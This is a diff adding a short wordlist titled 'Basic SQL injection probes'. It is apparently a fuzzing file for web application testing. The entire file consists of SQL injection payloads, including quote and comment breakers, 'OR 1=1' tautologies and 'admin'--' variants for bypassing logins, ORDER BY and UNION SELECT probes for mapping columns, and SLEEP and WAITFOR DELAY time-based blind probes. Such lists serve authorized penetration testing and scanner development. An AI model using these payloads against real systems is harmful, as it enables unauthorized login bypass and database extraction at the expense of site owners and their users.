@@ -1,0 +1,26 @@
+# Basic SQL injection probes
+'
+"
+''
+`
+')
+")
+';
+"--
+' --
+' #
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+" OR "1"="1" --
+' OR 1=1--
+') OR ('1'='1
+1' ORDER BY 1--
+1' ORDER BY 10--
+1 UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+admin'--
+admin' #
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR sleep(5)#
